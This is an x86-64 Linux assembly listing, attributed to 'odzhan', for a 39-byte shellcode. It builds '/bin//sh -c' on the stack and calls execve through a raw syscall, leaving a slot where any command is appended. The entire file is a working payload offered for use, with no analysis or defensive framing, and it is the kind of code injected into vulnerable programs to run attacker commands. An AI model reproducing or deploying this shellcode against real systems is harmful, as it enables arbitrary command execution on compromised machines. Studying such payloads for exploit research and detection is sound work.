

; 39 byte execute command for linux/x64
; odzhan

    bits    64
start64:
    push    59
    pop     rax              ; rax=sys_execve
    cdq                      ; penv=0
    mov     rcx, 0x68732f2f6e69622f
    push    rdx              ; 0
    push    rcx              ; "/bin//sh"
    push    rsp
    pop     rdi              ; rdi="/bin//sh", 0
    ; ---------
    push    rdx              ; 0
    push    word 0x632d      ; -c
    push    rsp
    pop     rbx              ; rbx="-c", 0
    push    rdx              ; NULL
    jmp     l_cmd64
r_cmd64:                     ; command
    push    rbx              ; "-c"
    push    rdi              ; "/bin//sh"
    push    rsp
    pop     rsi              ; rsi=args
    syscall
l_cmd64:
    call    r_cmd64
    ; put your command here followed by null terminator
    